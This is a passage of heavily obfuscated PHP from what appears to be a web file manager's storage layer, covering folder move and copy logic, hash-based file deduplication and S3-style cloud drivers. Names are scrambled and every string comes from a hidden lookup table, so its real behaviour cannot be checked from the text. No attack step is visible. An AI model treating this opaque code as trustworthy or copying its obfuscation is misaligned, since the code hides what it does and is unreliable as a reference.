REPEAT_RENAME_FOLDER) { $Åá¦Ã = REPEAT_RENAME; } $ŠÚÇ¬‘ = $this->_childrenListSelect($Ò®õ„¨); foreach ($ŠÚÇ¬‘ as $Á†¸Ê£†) { $this->_move($Á†¸Ê£†[$°˜£‹À[193]], $íüò”¹, $Åá¦Ã, $‘«ÍÎíŠ); } $ú©âî³ = !0; } } else { if ($Åá¦Ã == REPEAT_SKIP) { $ú©âî³ = !0; } else { if ($Åá¦Ã == REPEAT_RENAME || $Åá¦Ã == REPEAT_RENAME_FOLDER) { $ò‹ïî²ò = $this->fileNameAuto($‹âÛè…, $ò‹ïî²ò, $Åá¦Ã, $æéÀ©«); $ûÑ¾–“Ü = $this->_moveForce($Ò®õ„¨, $‹âÛè…, $ò‹ïî²ò); } else { if ($Åá¦Ã == REPEAT_REPLACE) { $´ÌÔ¤¯– = $this->sourceInfoCache($íüò”¹); $¹Ú”¡ôÒ = $this->fileHistory($´ÌÔ¤¯–, $×¨Ù÷›…[$°˜£‹À[541]], $×¨Ù÷›…[$°˜£‹À[79]]); $ú©âî³ = !0; if ($¹Ú”¡ôÒ) { $‘«ÍÎíŠ[$°˜£‹À[629]][] = $×¨Ù÷›…[$°˜£‹À[541]]; } } } } } if ($ú©âî³ && !$‘«ÍÎíŠ[$°˜£‹À[660]]) { $‘«ÍÎíŠ[$°˜£‹À[660]] = !0; } return $ûÑ¾–“Ü; } private function _moveForce($Ô„ü„Äˆ, $…ı¥Äúˆ, $Êæ«€Æê) { $õí±ŠÓ† =& $_SERVER[íïàËŸë]; $Éé½ï€Ñ = $this->sourceInfo($Ô„ü„Äˆ); $¥†Ô«ô = $this->sourceInfo($…ı¥Äúˆ); $à¬Ìæ«ï = $Éé½ï€Ñ[$õí±ŠÓ†[485]] == $õí±ŠÓ†[91]; $ÏÛ„²“´ = array($õí±ŠÓ†[477] => $¥†Ô«ô[$õí±ŠÓ†[193]], $õí±ŠÓ†[652] => $¥†Ô«ô[$õí±ŠÓ†[584]] . $¥†Ô«ô[$õí±ŠÓ†[193]] . $õí±ŠÓ†[50], $õí±ŠÓ†[648] => $¥†Ô«ô[$õí±ŠÓ†[190]], $õí±ŠÓ†[649] => $¥†Ô«ô[$õí±ŠÓ†[569]], $õí±ŠÓ†[651] => USER_ID, $õí±ŠÓ†[494] => $Êæ«€Æê); $ı×š¿–– = $Éé½ï€Ñ[$õí±ŠÓ†[190]] == SourceModel::TYPE_GROUP && $¥†Ô«ô[$õí±ŠÓ†[190]] == SourceModel::TYPE_GROUP && $Éé½ï€Ñ[$õí±ŠÓ†[569]] == $¥†Ô«ô[$õí±ŠÓ†[569]]; if (!$ı×š¿–– && $this->moveClearAuth) { Model($õí±ŠÓ†[567])->authClear($Ô„ü„Äˆ); } $ÄûÉÇ¶Á = $Éé½ï€Ñ[$õí±ŠÓ†[505]] == $õí±ŠÓ†[91] && $¥†Ô«ô[$õí±ŠÓ†[505]] != $õí±ŠÓ†[91]; if ($ÄûÉÇ¶Á) { $ÏÛ„²“´[$õí±ŠÓ†[504]] = 0; } if ($à¬Ìæ«ï) { $Ÿ…œ’¿ = array($õí±ŠÓ†[652] => array($õí±ŠÓ†[612], $Éé½ï€Ñ[$õí±ŠÓ†[584]] . $Éé½ï€Ñ[$õí±ŠÓ†[193]] . $õí±ŠÓ†[613])); $à‡‚­†… = $Éé½ï€Ñ[$õí±ŠÓ†[584]] . $Éé½ï€Ñ[$õí±ŠÓ†[193]] . $õí±ŠÓ†[50]; $‹¸ëÒÉà = $¥†Ô«ô[$õí±ŠÓ†[584]] . $¥†Ô«ô[$õí±ŠÓ†[193]] . $õí±ŠÓ†[50] . $Éé½ï€Ñ[$õí±ŠÓ†[193]] . $õí±ŠÓ†[50]; $ÌâÄ¾« = array($õí±ŠÓ†[652] => array($õí±ŠÓ†[661], "\162\x65\x70\x6c\x61\x63\145\50\160\141\162\x65\156\164\x4c\x65\x76\145\x6c\54\47{$à‡‚­†…}\47\54\x27{$‹¸ëÒÉà}\47\51"), $õí±ŠÓ†[648] => $¥†Ô«ô[$õí±ŠÓ†[190]], $õí±ŠÓ†[649] => $¥†Ô«ô[$õí±ŠÓ†[569]]); if ($ÄûÉÇ¶Á) { $ÌâÄ¾«[$õí±ŠÓ†[504]] = 0; } $this->where($Ÿ…œ’¿)->data($ÌâÄ¾«)->save(); } $this->where(array($õí±ŠÓ†[491] => $Ô„ü„Äˆ))->data($ÏÛ„²“´)->save(); return $Ô„ü„Äˆ; } private function clearShare($çĞÚ¹ˆ·, $Ÿ¸Æ¢ ¬) { $Ó”È©ª =& $_SERVER[íïàËŸë]; $¤‹à‡¨Ö = $this->sourceInfo($çĞÚ¹ˆ·); $æÌ÷ÔÚÛ = $this->sourceInfo($Ÿ¸Æ¢ ¬); if ($¤‹à‡¨Ö[$Ó”È©ª[569]] == $æÌ÷ÔÚÛ[$Ó”È©ª[569]] && $¤‹à‡¨Ö[$Ó”È©ª[190]] == $Ó”È©ª[662]) { return; } $ôº†ØÙ¨ = array($Ó”È©ª[584] => array($Ó”È©ª[612], $¤‹à‡¨Ö[$Ó”È©ª[584]] . $çĞÚ¹ˆ· . $Ó”È©ª[613])); $Õí™†·Ã = $this->field($Ó”È©ª[491])->where($ôº†ØÙ¨)->getField($Ó”È©ª[193], !0); if (!$Õí™†·Ã) { return; } $ôº†ØÙ¨ = array($Ó”È©ª[193] => array($Ó”È©ª[7], $Õí™†·Ã), $Ó”È©ª[663] => 1); $‹€™ßı = Model($Ó”È©ª[664])->field($Ó”È©ª[665])->where($ôº†ØÙ¨)->select(); if (!$‹€™ßı) { return; } $‹€™ßı = array_to_keyvalue($‹€™ßı, $Ó”È©ª[12], $Ó”È©ª[665]); $ôº†ØÙ¨ = array($Ó”È©ª[665] => array($Ó”È©ª[7], $‹€™ßı)); Model($Ó”È©ª[664])->where($ôº†ØÙ¨)->save(array($Ó”È©ª[663] => 0)); Model($Ó”È©ª[666])->where($ôº†ØÙ¨)->delete(); } public function copyFolderFromIO($óŒ˜ƒº„, $½­ËÉÅ¥, $’ş›Ë¢ˆ, $–¿´í , $¤†ÇšÃ¡, $ğóÉçÁÊ = false) { $â§›Ğœš =& $_SERVER[íïàËŸë]; $¾èÌışĞ = array($â§›Ğœš[630] => array(), $â§›Ğœš[631] => array(), $â§›Ğœš[629] => array(), $â§›Ğœš[667] => array()); $á‹ÎƒÑÕ = $ğóÉçÁÊ ? $ğóÉçÁÊ : $óŒ˜ƒº„->pathThis($½­ËÉÅ¥); $Ó¼™÷¨Å = $this->fileNameExist($’ş›Ë¢ˆ, $á‹ÎƒÑÕ); $÷ı…°— = $this->mkdir($’ş›Ë¢ˆ, $á‹ÎƒÑÕ, $–¿´í ); if (!$Ó¼™÷¨Å || $–¿´í  == REPEAT_RENAME_FOLDER) { $–¿´í  = !1; } if ($Ó¼™÷¨Å) { $this->_childrenAllMake($Ó¼™÷¨Å); } Hook::trigger($â§›Ğœš[668]); $this->_copyChildTo($óŒ˜ƒº„, $½­ËÉÅ¥, $÷ı…°—, $–¿´í , $¾èÌışĞ, $¤†ÇšÃ¡); Hook::trigger($â§›Ğœš[669]); if ($÷ı…°—) { $this->folderSizeResetChildren($÷ı…°—); } $this->_childrenListClear(); Model($â§›Ğœš[632])->addAll($¾èÌışĞ[$â§›Ğœš[630]], array(), !0); Model($â§›Ğœš[633])->eventCopy($÷ı…°—); $this->saveAll($¾èÌışĞ[$â§›Ğœš[631]]); Model($â§›Ğœš[544])->linkAdd($¾èÌışĞ[$â§›Ğœš[629]]); Model($â§›Ğœš[544])->remove($¾èÌışĞ[$â§›Ğœš[667]]); $this->folderSizeReset($’ş›Ë¢ˆ); $this->updateModifyTime($’ş›Ë¢ˆ); return $÷ı…°—; } private function _copyChildTo($ÔÎÕ­øÎ, $®¢ïîŞ’, $ˆÂ¢†Ìå, $÷á·½ø, &$Šûª¶áÃ, $ù÷Å·‹¥) { $ÚÓÙ¨ÕŞ =& $_SERVER[íïàËŸë]; $¡Ø»Îõ = $this->sourceInfoCache($ˆÂ¢†Ìå); $ÇŒ–ñ±ğ = $ÔÎÕ­øÎ->listPath($®¢ïîŞ’); $ÇŒ–ñ±ğ = $ÇŒ–ñ±ğ ? $ÇŒ–ñ±ğ : array($ÚÓÙ¨ÕŞ[86] => array(), $ÚÓÙ¨ÕŞ[85] => array()); $©ô‰ÛÑ§ = array_merge($ÇŒ–ñ±ğ[$ÚÓÙ¨ÕŞ[86]], $ÇŒ–ñ±ğ[$ÚÓÙ¨ÕŞ[85]]); $ä¦ÈĞ¶‰ = $this->_addFiles($ÔÎÕ­øÎ, $ÇŒ–ñ±ğ[$ÚÓÙ¨ÕŞ[86]], $ù÷Å·‹¥); $ˆÑŒ¡… = array(); foreach ($©ô‰ÛÑ§ as &$šÊèºû¼) { if (isset($ä¦ÈĞ¶‰[$šÊèºû¼[$ÚÓÙ¨ÕŞ[32]]])) { $šÊèºû¼ = $ä¦ÈĞ¶‰[$šÊèºû¼[$ÚÓÙ¨ÕŞ[32]]]; } $šÊèºû¼[$ÚÓÙ¨ÕŞ[485]] = $šÊèºû¼[$ÚÓÙ¨ÕŞ[33]] == $ÚÓÙ¨ÕŞ[78]; $šÊèºû¼[$ÚÓÙ¨ÕŞ[486]] = substr(_get($šÊèºû¼, $ÚÓÙ¨ÕŞ[169], $ÚÓÙ¨ÕŞ[12]), 0, 10); $šÊèºû¼[$ÚÓÙ¨ÕŞ[79]] = _get($šÊèºû¼, $ÚÓÙ¨ÕŞ[79], 0); $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]] = _get($šÊèºû¼, $ÚÓÙ¨ÕŞ[541], 0); if (!isset($šÊèºû¼[$ÚÓÙ¨ÕŞ[670]]) && $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]]) { $Šûª¶áÃ[$ÚÓÙ¨ÕŞ[667]][] = $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]]; } if ($÷á·½ø) { $­™ÇúÑô = $this->fileNameExistCache($ˆÂ¢†Ìå, $šÊèºû¼[$ÚÓÙ¨ÕŞ[32]]); if ($­™ÇúÑô) { if ($šÊèºû¼[$ÚÓÙ¨ÕŞ[485]] || $÷á·½ø == REPEAT_SKIP) { continue; } if ($÷á·½ø == REPEAT_REPLACE) { $®ü¨Ãò = $this->sourceInfoCache($­™ÇúÑô); $…¢¡Öû = $this->fileHistory($®ü¨Ãò, $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]], $šÊèºû¼[$ÚÓÙ¨ÕŞ[79]]); if ($…¢¡Öû) { $Šûª¶áÃ[$ÚÓÙ¨ÕŞ[629]][] = $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]]; } continue; } else { if ($÷á·½ø == REPEAT_RENAME) { $šÊèºû¼[$ÚÓÙ¨ÕŞ[32]] = $this->fileNameAutoCache($ˆÂ¢†Ìå, $šÊèºû¼[$ÚÓÙ¨ÕŞ[32]], $÷á·½ø, !1); } } } } if (!$šÊèºû¼[$ÚÓÙ¨ÕŞ[485]] && $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]] == 0) { continue; } if (!$šÊèºû¼[$ÚÓÙ¨ÕŞ[485]] && $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]]) { $Šûª¶áÃ[$ÚÓÙ¨ÕŞ[629]][] = $šÊèºû¼[$ÚÓÙ¨ÕŞ[541]]; } $ˆÑŒ¡…[] = $this->_makeItemData($šÊèºû¼, $¡Ø»Îõ, $šÊèºû¼[$ÚÓÙ¨ÕŞ[32]]); } unset($šÊèºû¼); if (!empty($ˆÑŒ¡…)) { $this->addAll($ˆÑŒ¡…); $this->_childrenListSelect($ˆÂ¢†Ìå); } $İ€À¥šÚ = $this->_childrenList($ˆÂ¢†Ìå); $İ€À¥šÚ = array_to_keyvalue($İ€À¥šÚ, $ÚÓÙ¨ÕŞ[32]); foreach ($©ô‰ÛÑ§ as $šÊèºû¼) { $®ü¨Ãò = $İ€À¥šÚ[$šÊèºû¼[$ÚÓÙ¨ÕŞ[32]]]; $ÓÍ¦ÃôŞ = $®ü¨Ãò[$ÚÓÙ¨ÕŞ[193]]; $this->_copyApplyMeta($®ü¨Ãò, $Šûª¶áÃ); if ($šÊèºû¼[$ÚÓÙ¨ÕŞ[33]] == $ÚÓÙ¨ÕŞ[78]) { $šÊèºû¼[$ÚÓÙ¨ÕŞ[87]] = $ÔÎÕ­øÎ->getPathInner($šÊèºû¼[$ÚÓÙ¨ÕŞ[87]]); $this->_copyChildTo($ÔÎÕ­øÎ, $šÊèºû¼[$ÚÓÙ¨ÕŞ[87]], $ÓÍ¦ÃôŞ, $÷á·½ø, $Šûª¶áÃ, $ù÷Å·‹¥); } } } private function _addFiles($¬£ıóú™, $ğ›‡±ê, $Ú¸³“ûÆ) { $¸š··Ê =& $_SERVER[íïàËŸë]; if (!$ğ›‡±ê || count($ğ›‡±ê) == 0) { return array(); } $ó¤‚ìè = array(); foreach ($ğ›‡±ê as &$°‚Â…·) { Hook::trigger($¸š··Ê[671], $°‚Â…·); $°‚Â…·[$¸š··Ê[87]] = $¬£ıóú™->getPathInner($°‚Â…·[$¸š··Ê[87]]); $ˆŒ¼õº = $¬£ıóú™->hashSimple($°‚Â…·[$¸š··Ê[87]]); $²õİõ˜¨ = $¬£ıóú™->hashMd5($°‚Â…·[$¸š··Ê[87]]); if (strlen($²õİõ˜¨) > 10 && !isset($ó¤‚ìè[$²õİõ˜¨])) { $ó¤‚ìè[$²õİõ˜¨] = array(); } $°‚Â…·[$¸š··Ê[672]] = $ˆŒ¼õº; $°‚Â…·[$¸š··Ê[547]] = $²õİõ˜¨; $ó¤‚ìè[$²õİõ˜¨][] =& $°‚Â…·; if (count($ó¤‚ìè[$²õİõ˜¨]) > 1) { $°‚Â…·[$¸š··Ê[670]] = !0; } Hook::trigger($¸š··Ê[673], $°‚Â…·); } unset($°‚Â…·); $Í¿Ø·¥Œ = array($¸š··Ê[547] => array($¸š··Ê[7], array_keys($ó¤‚ìè))); $ÕµáÂ¢ = Model($¸š··Ê[674]); $ÑÛâ£õœ = $ÕµáÂ¢->where($Í¿Ø·¥Œ)->select(); $ÑÛâ£õœ = $ÑÛâ£õœ ? $ÑÛâ£õœ : array(); foreach ($ÑÛâ£õœ as $¥„î«) { if (!isset($ó¤‚ìè[$¥„î«[$¸š··Ê[547]]])) { continue; } $Ú¸’ò„ñ = $ó¤‚ìè[$¥„î«[$¸š··Ê[547]]]; foreach ($Ú¸’ò„ñ as &$°‚Â…·) { $°‚Â…·[$¸š··Ê[541]] = $¥„î«[$¸š··Ê[541]]; $°‚Â…·[$¸š··Ê[670]] = !0; } unset($°‚Â…·); } $×ŸØöÈô = array(); foreach ($ğ›‡±ê as $Î‡Öı) { Hook::trigger($¸š··Ê[675], $Î‡Öı); if (isset($Î‡Öı[$¸š··Ê[670]]) && $Î‡Öı[$¸š··Ê[670]]) { Hook::trigger($¸š··Ê[676], $Î‡Öı); continue; } $‚ü²Á˜¦ = $¬£ıóú™->getPathInner($Î‡Öı[$¸š··Ê[87]]); $ôÔ‹ÕöÈ = $ÕµáÂ¢->addFileMake($‚ü²Á˜¦, $Î‡Öı[$¸š··Ê[79]], $Î‡Öı[$¸š··Ê[672]], $Î‡Öı[$¸š··Ê[547]], $Î‡Öı[$¸š··Ê[32]], $Ú¸³“ûÆ); Hook::trigger($¸š··Ê[676], $Î‡Öı); if (!is_array($ôÔ‹ÕöÈ)) { continue; } $×ŸØöÈô[] = $ôÔ‹ÕöÈ; } $ÕµáÂ¢->addAll($×ŸØöÈô); $Í¿Ø·¥Œ = array($¸š··Ê[547] => array($¸š··Ê[7], array_keys($ó¤‚ìè))); $ÑÛâ£õœ = $ÕµáÂ¢->where($Í¿Ø·¥Œ)->select(); $ÑÛâ£õœ = $ÑÛâ£õœ ? $ÑÛâ£õœ : array(); foreach ($ÑÛâ£õœ as $¥„î«) { if (!isset($ó¤‚ìè[$¥„î«[$¸š··Ê[547]]])) { continue; } $ª´Ìœõ =& $ó¤‚ìè[$¥„î«[$¸š··Ê[547]]]; foreach ($ª´Ìœõ as &$°‚Â…·) { $°‚Â…·[$¸š··Ê[541]] = $¥„î«[$¸š··Ê[541]]; } unset($°‚Â…·); } $±ô³—ÂŸ = array(); foreach ($ğ›‡±ê as $ƒÂˆ†‰ñ) { $±ô³—ÂŸ[$ƒÂˆ†‰ñ[$¸š··Ê[32]]] = $ƒÂˆ†‰ñ; } return $±ô³—ÂŸ; } } define($_SERVER[íïàËŸë][677], $_SERVER[íïàËŸë][678]); $wnxgupdimo = $_SERVER[íïàËŸë][679]; goto CÍ¨¡ù×Ö‰; Fî‡»éÎ: class PathDriverBOS extends PathDriverS3 { public function __construct($®ØşÏ¤) { parent::__construct($®ØşÏ¤); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Çâõß¿í) { $úª£Ô„ =& $_SERVER[íïàËŸë]; if (substr($Çâõß¿í, 0, 7) == $úª£Ô„[313]) { $Çâõß¿í = $úª£Ô„[314] . substr($Çâõß¿í, 7); } header($úª£Ô„[175] . $Çâõß¿í); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¿¦¼ş¸ñ) { parent::__construct($¿¦¼ş¸ñ); $this->setSignVersion($_SERVER[íïàËŸë][247]); } public function uploadFormData($”„½Áª², $âÄ‘ã¹Í = 3600) { $ë«¨µ¶¡ =& $_SERVER[íïàËŸë]; $”èù»Ë¿ = $ë«¨µ¶¡[229]; $¡–‹ÃÊ = $ë«¨µ¶¡[263]; $“àÙ™”¹ = $ë«¨µ¶¡[274]; $ãÃÎ«‡ê = gmdate($ë«¨µ¶¡[299], time() + $âÄ‘ã¹Í); $öèŸëØ¹ = (string) time() . $ë«¨µ¶¡[74] . (string) (time() + $âÄ‘ã¹Í); $¨Å«Çíò = array($ë«¨µ¶¡[275] => $ãÃÎ«‡ê, $ë«¨µ¶¡[278] => array(array($ë«¨µ¶¡[280] => $”èù»Ë¿), array($ë«¨µ¶¡[279] => $this->bucket), array($ë«¨µ¶¡[281], $ë«¨µ¶¡[282], $ë«¨µ¶¡[12]), array($ë«¨µ¶¡[285] => $“àÙ™”¹), array($ë«¨µ¶¡[1421] => $¡–‹ÃÊ), array($ë«¨µ¶¡[1422] => $this->accessKey), array($ë«¨µ¶¡[1423] => $öèŸëØ¹))); $¨Å«Çíò = json_encode($¨Å«Çíò); $‘ÈÈçäÃ = hash_hmac($ë«¨µ¶¡[263], $öèŸëØ¹, $this->secret); $íëôÓœË = sha1($¨Å«Çíò); $«¼ñĞºô = hash_hmac($ë«¨µ¶¡[263], $íëôÓœË, $‘ÈÈçäÃ); $ÓòúÕ­Ä = array($ë«¨µ¶¡[280] => $”èù»Ë¿, $ë«¨µ¶¡[285] => $“àÙ™”¹, $ë«¨µ¶¡[293] => base64_encode($¨Å«Çíò), $ë«¨µ¶¡[1421] => $¡–‹ÃÊ, $ë«¨µ¶¡[1422] => $this->accessKey, $ë«¨µ¶¡[1424] => $öèŸëØ¹, $ë«¨µ¶¡[1425] => $«¼ñĞºô, $ë«¨µ¶¡[208] => $this->getHost()); return $ÓòúÕ­Ä; } public function fileOutImage($¬ô“Í†, $Íåë¦ù = 250) { $Ê÷ä©Ò¬ =& $_SERVER[íïàËŸë]; if ($this->size($¬ô“Í†) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¬ô“Í†, $Íåë¦ù); } $Ğİ¦ßõë = $this->link($¬ô“Í†); $Ğİ¦ßõë .= $Ê÷ä©Ò¬[1426] . $Íåë¦ù . $Ê÷ä©Ò¬[1427]; $this->fileOutLink($Ğİ¦ßõë); } public function fileOutLink($òœ’½) { $¶õï ¬è =& $_SERVER[íïàËŸë]; if (substr($òœ’½, 0, 7) == $¶õï ¬è[313]) { $òœ’½ = $¶õï ¬è[314] . substr($òœ’½, 7); } header($¶õï ¬è[175] . $òœ’½); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ƒîâ•ˆ¢) { $this->pathParse = $ƒîâ•ˆ¢; $this->model = Model($_SERVER[íïàËŸë][1428]); } public function getPath($£ã‚Ÿõù) { return trim($£ã‚Ÿõù, $_SERVER[íïàËŸë][8]); } public function pathFather($àø€ÎÀ ) { $½®Áá¨ = $this->parse($àø€ÎÀ ); $½®Áá¨ = $this->infoSimple($àø€ÎÀ ); return $½®Áá¨ ? $½®Áá¨[$_SERVER[íïàËŸë][192]] : !1; } public function pathThis($ªù”›°¹) { $Ş°Ò§É• = $this->infoSimple($ªù”›°¹); return $Ş°Ò§É• ? $Ş°Ò§É•[$_SERVER[íïàËŸë][32]] : !1; } public function getPathOuter($ÌõÔ„ó³) { if (!$ÌõÔ„ó³) { return $ÌõÔ„ó³; } $à‹±›ú£ = $this->parse($ÌõÔ„ó³); return KodIO::make($à‹±›ú£[$_SERVER[íïàËŸë][475]]); } public function copyFolderFromIO($ë£ã, $äß£ÇÛ, $èáí³…, $îêµ”ÔÄ, $ŞÎà‹Œ®) { $Ø¿ñåË = $this->model->copyFolderFromIO($ë£ã, $äß£ÇÛ, $èáí³…, $îêµ”ÔÄ, $ŞÎà‹Œ®); return KodIO::make($Ø¿ñåË); } public function isParentOf($ì”Æ×õ, $À£¥Ï„) { return $this->model->isParentOf($ì”Æ×õ, $À£¥Ï„); } public function mkfile($ÊÉìÉõ©, $êğû‹±÷ = '', $úï¬‘·˜ = REPEAT_RENAME) { $ŠÁ÷Î² =& $_SERVER[íïàËŸë]; $ù¨ŠºÛê = $this->parse($ÊÉìÉõ©); $ÊÉìÉõ© = $ù¨ŠºÛê[$ŠÁ÷Î²[475]]; for ($–ÏÓ›„ = 0; $–ÏÓ›„ < count($ù¨ŠºÛê[$ŠÁ÷Î²[1429]]); $–ÏÓ›„++) { $‘‘ºÛ˜À = $ù¨ŠºÛê[$ŠÁ÷Î²[1429]][$–ÏÓ›„]; if ($–ÏÓ›„ == count($ù¨ŠºÛê[$ŠÁ÷Î²[1429]]) - 1) { $ÊÉìÉõ© = $this->model->mkfile($ÊÉìÉõ©, $‘‘ºÛ˜À, $êğû‹±÷, $úï¬‘·˜); break; } $ÊÉìÉõ© = $this->model->mkdir($ÊÉìÉõ©, $‘‘ºÛ˜À, REPEAT_SKIP); } return $this->getPathOuter($ÊÉìÉõ©); } public function mkdir($°ÚÈŸÓŸ, $„¬™¹ö¾ = REPEAT_SKIP) { $ïã×ã¢± =& $_SERVER[íïàËŸë]; $°İ ¨ÇÓ = $this->parse($°ÚÈŸÓŸ); $°ÚÈŸÓŸ = $°İ ¨ÇÓ[$ïã×ã¢±[475]]; for ($Ò°Ü¹æå = 0; $Ò°Ü¹æå < count($°İ ¨ÇÓ[$ïã×ã¢±[1429]]); $Ò°Ü¹æå++) { $ï™Ü›ÌÏ = $°İ ¨ÇÓ[$ïã×ã¢±[1429]][$Ò°Ü¹æå]; $°ÚÈŸÓŸ = $this->model->mkdir($°ÚÈŸÓŸ, $ï™Ü›ÌÏ, $„¬™¹ö¾); } return $this->getPathOuter($°ÚÈŸÓŸ); } public function copyFile($§ÒØê«´, $ëÚ‚¸™, $ŸÂ”ÍÃÅ = REPEAT_REPLACE) { $¨á¥Ş«ñ =& $_SERVER[íïàËŸë]; $Šé£Ò©¿ = $this->parse($ëÚ‚¸™); $Á¬¯îˆ¨ = $this->model->copy($§ÒØê«´, $Šé£Ò©¿[$¨á¥Ş«ñ[475]], $ŸÂ”ÍÃÅ, $Šé£Ò©¿[$¨á¥Ş«ñ[87]]); return $Á¬¯îˆ¨ ? $this->getPathOuter($Á¬¯îˆ¨) : !1; } public function moveFile($ÖÊ¢ã™¡, $¹˜¸Ì¹Ú, $¥×¢ÂÙ„ = REPEAT_REPLACE) { $ôŸ¥Ä»â =& $_SERVER[íïàËŸë]; $€é·Ÿµ½ = $this->parse($¹˜¸Ì¹Ú); $­¿ÄÜşÕ = $this->model->move($ÖÊ¢ã™¡, $€é·Ÿµ½[$ôŸ¥Ä»â[475]], $¥×¢ÂÙ„, $€é·Ÿµ½[$ôŸ¥Ä»â[87]]); return $­¿ÄÜşÕ ? $this->getPathOuter($­¿ÄÜşÕ) : !1; } public function copy($€¨¿¡Ìä, $”ĞáÀãğ, $ëË²Æ»ã = REPEAT_REPLACE, $Š …Ø½Ò = false) { $ÃÚò‹¼º = $this->parse($”ĞáÀãğ); $×¥ŸÄ«Ã = $this->model->copy($€¨¿¡Ìä, $ÃÚò‹¼º[$_SERVER[íïàËŸë][475]], $ëË²Æ»ã, $Š …Ø½Ò); return $×¥ŸÄ«Ã ? $this->getPathOuter($×¥ŸÄ«Ã) : !1; } public function moveSameAllow() { } public function move($ÂÒá£ê³, $éÜÇ»ãı, $´‹—ö×… = REPEAT_REPLACE, $Š×€Ğúİ = false) { $çŞ‰ìÕ = $this->parse($éÜÇ»ãı); $ìéŠ•ìŞ = $this->model->move($ÂÒá£ê³, $çŞ‰ìÕ[$_SERVER[íïàËŸë][475]], $´‹—ö×…, $Š×€Ğúİ); return $ìéŠ•ìŞ ? $this->getPathOuter($ìéŠ•ìŞ) : !1; } public function remove($…¨Ñ¡–À, $å«½¯Áç = true) { return $this->model->remove($…¨Ñ¡–À, $å«½¯Áç); } public function rename($û‚ø¯Ò¯, $É´•îè) { $¾ÖÄÍÓË = $this->model->rename($û‚ø¯Ò¯, $É´•îè); return $¾ÖÄÍÓË ? $this->getPathOuter($û‚ø¯Ò¯) : $¾ÖÄÍÓË; } public function size($İÉ”ˆ§) { $˜–Ò¥æõ = $this->infoSimple($İÉ”ˆ§); return $˜–Ò¥æõ ? $˜–Ò¥æõ[$_SERVER[íïàËŸë][79]] : 0; } public function infoSimple($¿â¡ùä») { return $this->model->sourceInfo($¿â¡ùä»); } public function info($ÆéÆü¨Ÿ) { return $this->infoParse($ÆéÆü¨Ÿ); } public function infoAuth($ÃÓµ¬Ù’) { return $this->infoParse($ÃÓµ¬Ù’, !1, !0); } public function infoWithChildren($ØçãŒ÷à) { return $this->infoParse($ØçãŒ÷à, !0); } protected function infoParse($¬ıË²¯, $ŸƒÑô¶Œ = false, $‹ÈÁü³Á = false) { if (!$ŸƒÑô¶Œ) { return $this->model->pathInfo($¬ıË²¯, $‹ÈÁü³Á); } return $this->model->pathInfoMore($¬ıË²¯); } public function infoFullSimple($£ß‡×¼Ë) { $¬ÇÀ•± =& $_SERVER[íïàËŸë]; $ŞÏà¯¢” = explode($¬ÇÀ•±[8], $£ß‡×¼Ë); $Ã‘ñàæò = implode($¬ÇÀ•±[8], array_splice($ŞÏà¯¢”, 1)); return $this->model->pathInfoByPath($ŞÏà¯¢”[0], $Ã‘ñàæò); } public function infoFull($•„âÙ ™) { $ò²ÚêÆ = $this->infoFullSimple($•„âÙ ™); return is_array($ò²ÚêÆ) ? $this->model->pathInfo($ò²ÚêÆ[$_SERVER[íïàËŸë][193]]) : !1; } public function hashSimple($²å‡¹×Š) { $¥ÀÂïØ =& $_SERVER[íïàËŸë]; $’å¼’£ = $this->infoWithChildren($²å‡¹×Š); return $’å¼’£[$¥ÀÂïØ[170]][$¥ÀÂïØ[672]]; } public function hashMd5($öúñìŞ) { $‰Ã®ÖéÀ =& $_SERVER[íïàËŸë]; $ôŞ¤¢Ê– = $this->infoWithChildren($öúñìŞ); return $ôŞ¤¢Ê–[$‰Ã®ÖéÀ[170]][$‰Ã®ÖéÀ[547]]; } public function exist($ë•¸ùµÉ) { $‹´Ú‹À¹ =& $_SERVER[íïàËŸë]; $ŠßİÔÍÓ = $this->parse($ë•¸ùµÉ); if (!$ŠßİÔÍÓ[$‹´Ú‹À¹[87]]) { return $this->isFile($ë•¸ùµÉ) || $this->isFolder($ë•¸ùµÉ); } $× ş–Âï = array($‹´Ú‹À¹[477] => $ŠßİÔÍÓ[$‹´Ú‹À¹[475]], $‹´Ú‹À¹[32] => $ŠßİÔÍÓ[$‹´Ú‹À¹[87]]); $£èê¤ = $this->model->where($× ş–Âï)->find(); return $£èê¤ ? !0 : !1; } public function isFile($™ÊÖÄ¡×) { $¨ —ÆÊ =& $_SERVER[íïàËŸë]; $ ÔÉÜ¼â = $this->infoSimple($™ÊÖÄ¡×); return $ ÔÉÜ¼â && $ ÔÉÜ¼â[$¨ —ÆÊ[485]] == $¨ —ÆÊ[228] ? !0 : !1; } public function isFolder($ÔÀ™Ã¦ˆ) { $¶ÖíŠÓŠ =& $_SERVER[íïàËŸë]; $Í»Ù·Ï± = $this->infoSimple($ÔÀ™Ã¦ˆ); return $Í»Ù·Ï± && $Í»Ù·Ï±[$¶ÖíŠÓŠ[485]] == $¶ÖíŠÓŠ[91] ? !0 : !1; } public function listPath($¿Á¡ë–“, $Ñ©Æ¿Â» = false) { $Ê©İóšÉ =& $_SERVER[íïàËŸë]; if ($¿Á¡ë–“ == $Ê©İóšÉ[12]) { return !1; } $âğ©ØØ§ = array($Ê©İóšÉ[477] => $¿Á¡ë–“); if ($Ñ©Æ¿Â») { return $this->model->listSource($âğ©ØØ§, -1); } return $this->model->listSource($âğ©ØØ§); } public function has($öÏÃõç, $Æ“ú†’Í = false, $¿ÈšÄ«÷ = null) { $€Æêò‘£ =& $_SERVER[íïàËŸë]; $«²òÃÃ¡ = $this->infoWithChildren($öÏÃõç); if ($Æ“ú†’Í) { return array($€Æêò‘£[240] => $«²òÃÃ¡[$€Æêò‘£[240]], $€Æêò‘£[239] => $«²òÃÃ¡[$€Æêò‘£[239]]); } return $¿ÈšÄ«÷ ? $«²òÃÃ¡[$€Æêò‘£[240]] : $«²òÃÃ¡[$€Æêò‘£[239]]; } public function listAll($‘“Ì‚Š) { $öÙãŠ·Ú = IO::info($this->pathParse[$_SERVER[íïàËŸë][87]]); if 